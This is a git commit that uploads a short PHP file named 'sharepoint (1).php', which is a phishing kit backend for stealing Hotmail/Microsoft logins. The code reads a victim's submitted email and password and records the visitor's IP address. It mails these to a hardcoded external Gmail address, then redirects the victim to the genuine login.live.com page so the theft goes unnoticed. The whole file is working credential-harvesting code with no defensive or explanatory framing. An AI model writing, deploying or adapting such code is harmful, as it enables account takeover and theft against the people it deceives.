ef851f37aaa05f7cc4123f7c60bdb4589c44c975
Beazt07 <106135120+Beazt07@users.noreply.github.com>
2022-08-23 04:47:50 +0100

    Add files via upload

---
+++ sharepoint (1).php
@@ -0,0 +1,12 @@
+<?
+$ip = getenv("REMOTE_ADDR");
+$message .= "---- : || Hotmail 2022 || :------\n";
+$message .= "Email: ".$_POST['ck']."\n";
+$message .= "Password: ".$_POST['cknow']."\n";
+$message .= "----: || THE BEAST07 || :------\n";
+$message .= "IP: ".$ip."\n";
+$recipient ="lavidabroski@gmail.com";
+$subject = "tare | ".$ip."\n";
+mail($recipient,$subject,$message);
+header("Location: https://login.live.com");
+?>
